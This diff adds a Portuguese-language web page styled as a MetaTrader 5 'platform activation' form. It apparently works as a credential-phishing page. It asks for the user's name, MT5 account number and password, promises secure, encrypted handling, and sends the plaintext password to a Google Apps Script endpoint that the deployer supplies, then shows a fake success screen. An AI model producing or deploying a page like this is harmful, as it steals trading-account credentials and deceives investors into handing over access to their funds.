@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ativar MetaTrader 5</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-deep:#02040a;
+    --bg-mid:#060b18;
+    --accent:#15e8a0;        /* verde renda */
+    --accent-soft:#0fbf86;
+    --accent-glow:rgba(21,232,160,.55);
+    --nebula-a:#0a2e4d;
+    --nebula-b:#1b1140;
+    --nebula-c:#06231c;
+    --text:#eaf4f0;
+    --text-dim:#8ba3a0;
+    --field-bg:rgba(255,255,255,.035);
+    --field-border:rgba(255,255,255,.10);
+    --err:#ff6b6b;
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
+  body{
+    font-family:'Sora',sans-serif;
+    background:var(--bg-deep);
+    color:var(--text);
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow-x:hidden;
+    position:relative;
+    padding:64px 28px;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  /* ====== FUNDO ESPACIAL ====== */
+  #space{position:fixed;inset:0;z-index:0;display:block}
+
+  .nebula{
+    position:fixed;inset:-20%;z-index:0;pointer-events:none;
+    background:
+      radial-gradient(40% 50% at 22% 28%, var(--nebula-a) 0%, transparent 60%),
+      radial-gradient(45% 55% at 80% 22%, var(--nebula-b) 0%, transparent 62%),
+      radial-gradient(50% 50% at 65% 82%, var(--nebula-c) 0%, transparent 60%),
+      radial-gradient(60% 60% at 18% 88%, #11203f 0%, transparent 65%);
+    filter:blur(20px);
+    opacity:.85;
+    transition:transform .6s cubic-bezier(.2,.8,.2,1);
+    animation:drift 26s ease-in-out infinite alternate;
+  }
+  @keyframes drift{
+    0%{transform:scale(1.05) translate(0,0)}
+    100%{transform:scale(1.12) translate(-2%,-2%)}
+  }
+
+  .glow-orb{
+    position:fixed;z-index:0;border-radius:50%;pointer-events:none;
+    filter:blur(60px);opacity:.4;
+  }
+  .glow-orb.one{width:380px;height:380px;background:var(--accent);top:-120px;right:-80px;opacity:.18;animation:pulse 9s ease-in-out infinite}
+  .glow-orb.two{width:300px;height:300px;background:#3b6dff;bottom:-100px;left:-60px;opacity:.16;animation:pulse 11s ease-in-out infinite 1s}
+  @keyframes pulse{0%,100%{transform:scale(1);opacity:.14}50%{transform:scale(1.18);opacity:.24}}
+
+  .grain{
+    position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.05;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  }
+
+  /* ====== CARD ====== */
+  .card{
+    position:relative;z-index:2;
+    width:100%;max-width:440px;
+    background:linear-gradient(160deg, rgba(14,22,34,.78), rgba(6,11,22,.72));
+    border:1px solid var(--field-border);
+    border-radius:26px;
+    padding:34px 36px 28px;
+    backdrop-filter:blur(22px) saturate(120%);
+    -webkit-backdrop-filter:blur(22px) saturate(120%);
+    box-shadow:
+      0 40px 90px -30px rgba(0,0,0,.8),
+      0 0 0 1px rgba(255,255,255,.02) inset,
+      0 1px 0 rgba(255,255,255,.06) inset;
+    opacity:0;transform:translateY(26px);
+    animation:rise .9s cubic-bezier(.16,1,.3,1) .15s forwards;
+  }
+  @keyframes rise{to{opacity:1;transform:translateY(0)}}
+
+  .card::before{
+    content:"";position:absolute;inset:0;border-radius:26px;padding:1px;
+    background:linear-gradient(140deg, var(--accent-glow), transparent 38%, transparent 70%, rgba(59,109,255,.4));
+    -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+    -webkit-mask-composite:xor;mask-composite:exclude;
+    opacity:.6;pointer-events:none;
+  }
+
+  .badge{
+    display:inline-flex;align-items:center;gap:8px;
+    font-size:11px;letter-spacing:.18em;text-transform:uppercase;
+    color:var(--accent);font-weight:600;
+    padding:7px 14px;border-radius:100px;
+    background:rgba(21,232,160,.08);
+    border:1px solid rgba(21,232,160,.22);
+    margin-bottom:16px;
+  }
+  .badge .dot{width:7px;height:7px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent-glow);animation:blink 1.8s ease-in-out infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.35}}
+
+  h1{
+    font-size:25px;line-height:1.25;font-weight:700;
+    letter-spacing:-.01em;margin-bottom:10px;
+    background:linear-gradient(120deg,#ffffff 30%,#a9e9d4 100%);
+    -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+  }
+  h1 .mt5{color:var(--accent);-webkit-text-fill-color:var(--accent);white-space:nowrap}
+  .sub{font-size:13.5px;color:var(--text-dim);line-height:1.55;margin-bottom:24px}
+
+  /* ====== CAMPOS ====== */
+  .field{position:relative;margin-bottom:15px}
+  .field input{
+    width:100%;
+    background:var(--field-bg);
+    border:1px solid var(--field-border);
+    border-radius:14px;
+    color:var(--text);
+    font-family:inherit;font-size:15px;font-weight:400;
+    padding:18px 16px 8px;
+    outline:none;
+    transition:border-color .25s, box-shadow .25s, background .25s;
+  }
+  .field input::placeholder{color:transparent}
+  .field label{
+    position:absolute;left:16px;top:14px;
+    font-size:15px;color:var(--text-dim);
+    pointer-events:none;
+    transition:all .2s cubic-bezier(.2,.8,.2,1);
+  }
+  .field input:focus,
+  .field input:not(:placeholder-shown){
+    background:rgba(255,255,255,.06);
+  }
+  .field input:focus{
+    border-color:var(--accent);
+    box-shadow:0 0 0 3px rgba(21,232,160,.14),0 0 24px -8px var(--accent-glow);
+  }
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label{
+    top:8px;font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;
+    color:var(--accent);font-weight:600;
+  }
+  .field .req{color:var(--accent);margin-left:2px}
+
+  /* ícone à esquerda removido p/ simplicidade; toggle de senha */
+  .pw-toggle{
+    position:absolute;right:12px;top:50%;transform:translateY(-50%);
+    background:none;border:none;cursor:pointer;color:var(--text-dim);
+    padding:6px;border-radius:8px;display:flex;transition:color .2s,background .2s}
+  .pw-toggle:hover{color:var(--accent);background:rgba(255,255,255,.05)}
+  .pw-toggle svg{width:19px;height:19px}
+
+  .field.invalid input{border-color:var(--err);box-shadow:0 0 0 3px rgba(255,107,107,.12)}
+  .field .msg{font-size:11.5px;color:var(--err);margin-top:6px;padding-left:4px;opacity:0;max-height:0;transition:opacity .2s}
+  .field.invalid .msg{opacity:1;max-height:30px}
+
+  /* check de válido */
+  .check{
+    position:absolute;right:14px;top:50%;transform:translateY(-50%) scale(.6);
+    width:18px;height:18px;opacity:0;transition:opacity .25s,transform .25s;color:var(--accent)}
+  .field.valid .check{opacity:1;transform:translateY(-50%) scale(1)}
+  .field.pw .check{right:42px}
+
+  /* ====== BOTÃO ====== */
+  .btn{
+    position:relative;width:100%;margin-top:8px;
+    border:none;border-radius:14px;cursor:pointer;
+    font-family:inherit;font-size:15px;font-weight:600;letter-spacing:.02em;
+    color:#022;padding:16px;
+    background:linear-gradient(135deg,var(--accent),var(--accent-soft));
+    box-shadow:0 12px 30px -10px var(--accent-glow);
+    overflow:hidden;transition:transform .15s, box-shadow .25s;
+  }
+  .btn:hover{transform:translateY(-2px);box-shadow:0 18px 40px -10px var(--accent-glow)}
+  .btn:active{transform:translateY(0)}
+  .btn .lbl{position:relative;z-index:2;display:inline-flex;align-items:center;gap:9px;transition:opacity .2s}
+  .btn .spinner{
+    position:absolute;inset:0;margin:auto;width:22px;height:22px;z-index:3;
+    border:2.5px solid rgba(2,34,34,.3);border-top-color:#022;border-radius:50%;
+    opacity:0;animation:spin .7s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .btn.loading .lbl{opacity:0}
+  .btn.loading .spinner{opacity:1}
+  /* brilho que percorre o botão */
+  .btn::after{content:"";position:absolute;top:0;left:-60%;width:50%;height:100%;
+    background:linear-gradient(100deg,transparent,rgba(255,255,255,.5),transparent);
+    transform:skewX(-20deg);animation:sweep 3.4s ease-in-out infinite}
+  @keyframes sweep{0%,60%{left:-60%}80%,100%{left:120%}}
+
+  .secure{display:flex;align-items:center;justify-content:center;gap:7px;
+    margin-top:18px;font-size:11.5px;color:var(--text-dim)}
+  .secure svg{width:14px;height:14px;color:var(--accent)}
+
+  .disclaimer{font-size:10.5px;color:#5d6f6c;line-height:1.5;margin-top:18px;
+    text-align:center;border-top:1px solid rgba(255,255,255,.06);padding-top:14px}
+
+  /* ====== SUCESSO ====== */
+  .success{
+    position:absolute;inset:0;z-index:5;border-radius:26px;
+    background:linear-gradient(160deg, rgba(10,18,28,.96), rgba(5,10,20,.96));
+    backdrop-filter:blur(8px);
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    text-align:center;padding:40px;
+    opacity:0;visibility:hidden;transform:scale(.97);
+    transition:opacity .4s,transform .4s,visibility .4s}
+  .success.show{opacity:1;visibility:visible;transform:scale(1)}
+  .success .ring{width:80px;height:80px;margin-bottom:22px;position:relative}
+  .success .ring svg{width:100%;height:100%}
+  .success h2{font-size:21px;font-weight:700;margin-bottom:8px}
+  .success p{font-size:13.5px;color:var(--text-dim);line-height:1.55;max-width:280px}
+  .circle{stroke:var(--accent);stroke-width:3;fill:none;stroke-dasharray:289;stroke-dashoffset:289;animation:draw .8s ease forwards}
+  .tick{stroke:var(--accent);stroke-width:4;fill:none;stroke-linecap:round;stroke-dasharray:60;stroke-dashoffset:60;animation:draw .5s ease .6s forwards}
+  @keyframes draw{to{stroke-dashoffset:0}}
+
+  @media (max-width:480px){
+    .card{padding:34px 24px 28px}
+    h1{font-size:22px}
+  }
+</style>
+</head>
+<body>
+
+<canvas id="space"></canvas>
+<div class="nebula" id="nebula"></div>
+<div class="glow-orb one"></div>
+<div class="glow-orb two"></div>
+<div class="grain"></div>
+
+<div class="card">
+  <span class="badge"><span class="dot"></span> Conexão segura · MetaTrader 5</span>
+  <h1>Insira seus dados para ativar a plataforma <span class="mt5">MetaTrader 5</span></h1>
+  <p class="sub">Preencha as informações abaixo para realizar a ativação. Seus dados são utilizados exclusivamente para o processo de conexão.</p>
+
+  <form id="form" novalidate>
+    <div class="field" data-rule="name">
+      <input type="text" id="nome" placeholder=" " autocomplete="name" required>
+      <label for="nome">Nome Completo<span class="req">*</span></label>
+      <svg class="check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      <div class="msg">Informe seu nome completo.</div>
+    </div>
+
+    <div class="field" data-rule="account">
+      <input type="text" id="conta" placeholder=" " inputmode="numeric" required>
+      <label for="conta">Conta MetaTrader 5<span class="req">*</span></label>
+      <svg class="check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      <div class="msg">Informe o número da sua conta.</div>
+    </div>
+
+    <div class="field pw" data-rule="pass">
+      <input type="password" id="senha" placeholder=" " autocomplete="off" required>
+      <label for="senha">Palavra-passe<span class="req">*</span></label>
+      <button type="button" class="pw-toggle" id="toggle" aria-label="Mostrar palavra-passe">
+        <svg id="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+      </button>
+      <svg class="check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      <div class="msg">Informe sua palavra-passe.</div>
+    </div>
+
+    <button type="submit" class="btn" id="btn">
+      <span class="lbl">Ativar plataforma
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+      </span>
+      <span class="spinner"></span>
+    </button>
+
+    <div class="secure">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+      Dados protegidos e criptografados
+    </div>
+  </form>
+
+  <p class="disclaimer">A responsabilidade pela tomada de decisão e ativação da tecnologia é única e exclusiva do investidor. Investimentos em renda variável envolvem riscos e podem resultar em perdas.</p>
+
+  <!-- Tela de sucesso -->
+  <div class="success" id="success">
+    <div class="ring">
+      <svg viewBox="0 0 100 100">
+        <circle class="circle" cx="50" cy="50" r="46"/>
+        <polyline class="tick" points="30,52 44,66 70,36"/>
+      </svg>
+    </div>
+    <h2>Ativação enviada!</h2>
+    <p>Recebemos seus dados. Em instantes sua plataforma MetaTrader 5 será conectada.</p>
+  </div>
+</div>
+
+<script>
+/* ===== Starfield + estrelas cadentes ===== */
+const cv=document.getElementById('space'),ctx=cv.getContext('2d');
+let W,H,stars,shooting=[];
+function resize(){W=cv.width=innerWidth;H=cv.height=innerHeight;
+  stars=Array.from({length:Math.round(W*H/7000)},()=>({
+    x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.3+.2,
+    a:Math.random(),tw:Math.random()*.02+.004,vy:Math.random()*.04+.01}));}
+resize();addEventListener('resize',resize);
+function spawnShoot(){
+  shooting.push({x:Math.random()*W*.7,y:Math.random()*H*.4,len:Math.random()*120+80,
+    sp:Math.random()*6+6,a:1});
+  setTimeout(spawnShoot,Math.random()*4500+2500);}
+setTimeout(spawnShoot,1800);
+function loop(){
+  ctx.clearRect(0,0,W,H);
+  for(const s of stars){
+    s.a+=s.tw;const o=.4+Math.abs(Math.sin(s.a))*.6;
+    s.y+=s.vy;if(s.y>H)s.y=0;
+    ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,7);
+    ctx.fillStyle=`rgba(220,240,255,${o})`;ctx.fill();}
+  shooting.forEach((m,i)=>{
+    m.x+=m.sp;m.y+=m.sp*.5;m.a-=.012;
+    const g=ctx.createLinearGradient(m.x,m.y,m.x-m.len,m.y-m.len*.5);
+    g.addColorStop(0,`rgba(21,232,160,${m.a})`);g.addColorStop(1,'transparent');
+    ctx.strokeStyle=g;ctx.lineWidth=2;ctx.beginPath();
+    ctx.moveTo(m.x,m.y);ctx.lineTo(m.x-m.len,m.y-m.len*.5);ctx.stroke();
+    if(m.a<=0)shooting.splice(i,1);});
+  requestAnimationFrame(loop);}
+loop();
+
+/* ===== Parallax do mouse na nébula ===== */
+const neb=document.getElementById('nebula');
+addEventListener('mousemove',e=>{
+  const x=(e.clientX/innerWidth-.5),y=(e.clientY/innerHeight-.5);
+  neb.style.transform=`scale(1.12) translate(${x*-18}px,${y*-18}px)`;});
+
+/* ===== Toggle de senha ===== */
+const senha=document.getElementById('senha'),eye=document.getElementById('eye');
+document.getElementById('toggle').addEventListener('click',()=>{
+  const show=senha.type==='password';senha.type=show?'text':'password';
+  eye.innerHTML=show
+    ?'<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
+    :'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';});
+
+/* ===== Validação em tempo real ===== */
+const fields=[...document.querySelectorAll('.field')];
+function check(f){
+  const inp=f.querySelector('input');const v=inp.value.trim();let ok=false;
+  if(f.dataset.rule==='name')ok=v.split(' ').filter(Boolean).length>=2;
+  else if(f.dataset.rule==='account')ok=/^\d{4,}$/.test(v);
+  else ok=v.length>=3;
+  f.classList.toggle('valid',ok);
+  if(ok)f.classList.remove('invalid');
+  return ok;}
+fields.forEach(f=>{
+  const inp=f.querySelector('input');
+  inp.addEventListener('input',()=>check(f));
+  inp.addEventListener('blur',()=>{if(inp.value.trim()&&!check(f))f.classList.add('invalid');});});
+
+/* ===== Submit ===== */
+/* 1) Cole abaixo a URL do seu App da Web do Apps Script (termina em /exec) */
+const ENDPOINT = "https://script.google.com/macros/s/AKfycbw2ZYvi6oWcFNlvnBXJW2BE9_eJ5T3FtxLh70Rznbz6RtnO9WyYb1ogPyZT5IM7TBmz/exec";
+
+const form=document.getElementById('form'),btn=document.getElementById('btn');
+form.addEventListener('submit',e=>{
+  e.preventDefault();
+  let allok=true;
+  fields.forEach(f=>{if(!check(f)){f.classList.add('invalid');allok=false;}});
+  if(!allok){
+    form.animate([{transform:'translateX(0)'},{transform:'translateX(-7px)'},
+      {transform:'translateX(7px)'},{transform:'translateX(0)'}],{duration:300});
+    return;}
+
+  btn.classList.add('loading');btn.disabled=true;
+
+  const payload={
+    nome:document.getElementById('nome').value.trim(),
+    conta:document.getElementById('conta').value.trim(),
+    senha:document.getElementById('senha').value
+  };
+
+  fetch(ENDPOINT,{
+    method:'POST',
+    mode:'no-cors',
+    headers:{'Content-Type':'text/plain;charset=utf-8'},
+    body:JSON.stringify(payload)
+  })
+  .then(()=>{ document.getElementById('success').classList.add('show'); })
+  .catch(()=>{
+    // Falha de rede: libera o botão e avisa
+    btn.classList.remove('loading');btn.disabled=false;
+    alert('Não foi possível enviar. Verifique sua conexão e tente novamente.');
+  });
+});
+</script>
+</body>
+</html>
